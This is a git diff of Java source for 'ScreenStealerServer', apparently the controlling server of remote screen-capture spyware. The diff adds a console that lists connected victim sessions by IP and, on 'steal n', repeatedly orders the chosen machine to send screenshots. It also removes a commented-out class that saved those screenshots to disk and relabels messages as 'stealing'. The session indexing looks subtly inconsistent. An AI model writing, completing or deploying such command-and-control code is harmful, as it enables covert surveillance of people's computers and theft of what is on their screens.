@@ -28,71 +28,6 @@ abstract class Cmd {
 	public static final String TAKE_SCREEN_SHOT = "TSS";
 }
 
-//class CaptureManager {
-//
-//	private DataOutputStream dos;
-//	private ObjectInputStream ois;
-//
-//	private static class Singleton {
-//		static CaptureManager INSTANCE = new CaptureManager();
-//	}
-//
-//	public static CaptureManager getInstance() {
-//		return Singleton.INSTANCE;
-//	}
-//
-//	public void capture(DataOutputStream dos, ObjectInputStream ois) throws Exception {
-//		setStream(dos, ois);
-//
-//		if (!sendCommand(Cmd.TAKE_SCREEN_SHOT))
-//			throw new Exception("Session closed");
-//
-//		byte[] screenCaptureByteArray = getScreenCaptureByteArray();
-//		if (screenCaptureByteArray == null)
-//			return;
-//
-//		update(screenCaptureByteArray);
-//	}
-//
-//	private void setStream(DataOutputStream dos, ObjectInputStream ois) {
-//		this.dos = dos;
-//		this.ois = ois;
-//	}
-//
-//	private boolean sendCommand(String cmd) {
-//		try {
-//			dos.writeUTF(cmd);
-//			return true;
-//		} catch (Exception e) {
-//			e.printStackTrace();
-//			return false;
-//		}
-//	}
-//
-//	private byte[] getScreenCaptureByteArray() {
-//		try {
-//			return (byte[]) ois.readObject();
-//		} catch (Exception e) {
-//			e.printStackTrace();
-//			return null;
-//		}
-//	}
-//
-//	private boolean update(byte[] captureImage) {
-//		try {
-//			String randomFileName = "" + System.currentTimeMillis() + ".jpg";
-//			FileOutputStream fos = new FileOutputStream(randomFileName);
-//			fos.write(captureImage);
-//			fos.close();
-//
-//			return true;
-//		} catch (Exception e) {
-//			e.printStackTrace();
-//			return false;
-//		}
-//	}
-//}
-
 class Commander {
 
 	private BufferedReader br;
@@ -115,7 +50,7 @@ class Commander {
 					dos.writeUTF(Cmd.TAKE_SCREEN_SHOT);
 					Thread.sleep(pRes.INTERVAL);
 				} catch (Exception e) {
-					System.out.println("Command was interrupted.");
+					System.out.println("Stealing was interrupted.");
 					break;
 				}
 			}
@@ -125,7 +60,7 @@ class Commander {
 	public void command(DataOutputStream dos) {
 		this.dos = dos;
 
-		System.out.println("Press 'e' to interrupt command.\n");
+		System.out.println("Press 'e' to interrupt stealing.\n");
 		commandThread.start();
 		while (true) {
 			try {
@@ -133,7 +68,7 @@ class Commander {
 				if (input.equals("e"))
 					break;
 
-				System.out.println("\nPress 'e' to end command.");
+				System.out.println("\nPress 'e' to end stealing.");
 			} catch (Exception e) {
 				e.printStackTrace();
 				break;
@@ -242,7 +177,7 @@ class IO {
 
 		String cmd = null;
 		while (true) {
-			System.out.println("\nscreenstealer > ");
+			System.out.print("\nscreenstealer > ");
 			try {
 				cmd = br.readLine();
 			} catch (Exception e) {
@@ -255,30 +190,47 @@ class IO {
 			if (isolated.length == 1) {
 				switch (isolated[0]) {
 				case "sessions":
+					if (pRes.sessionList.size() == 0) {
+						System.out.println("No session was connedted.");
+						break;
+					}
+					System.out.println();
+					for (int i = 0; i < pRes.sessionList.size(); ++i)
+						System.out.println(i + 1 + "        " + pRes.sessionList.get(i).getIp());
 					break;
 
 				case "exit":
 				case "quit":
-					return;
+					System.exit(0);
+
+				default:
+					invalidCommand();
+					break;
 				}
-			} else if (isolated[0].equals("steal")) {
+			} else if (isolated.length == 2 && isolated[0].equals("steal")) {
 				try {
 					sessionIdx = Integer.parseInt(isolated[1]);
 				} catch (Exception e) {
-					System.out.println("Invalid command.");
-					System.out.println("Use 'sessions' or 'steal n', n = session number.");
+					invalidCommand();
 					continue;
 				}
 
-			
-			if (pRes.sessionList.size() < sessionIdx)
-				System.out.print("Session index outofbounds");
-				continue;
-			}
-			
-			Session session = pRes.sessionList.get(sessionIdx);
-			Commander.getInstance().command(session.getDos());
+				if (pRes.sessionList.size() < sessionIdx) {
+					System.out.println("There is no session " + sessionIdx);
+					continue;
+				}
+
+				Session session = pRes.sessionList.get(sessionIdx);
+				Commander.getInstance().command(session.getDos());
+			} else
+				invalidCommand();
+
 		}
+	}
+
+	private void invalidCommand() {
+		System.out.println("Invalid command.");
+		System.out.println("Use 'sessions' or 'steal n', n = session number.");
 	}
 }
 
@@ -309,13 +261,15 @@ public class ScreenStealerServer {
 	}
 
 	private void acceptClient() {
-		while (true) {
-			try {
-				Socket sessionSocket = pRes.serverSocket.accept();
-				new Thread(new Session(sessionSocket)).start();
-			} catch (Exception e) {
-				e.printStackTrace();
+		new Thread(() -> {
+			while (true) {
+				try {
+					Socket sessionSocket = pRes.serverSocket.accept();
+					new Thread(new Session(sessionSocket)).start();
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
 			}
-		}
+		}).start();
 	}
 }
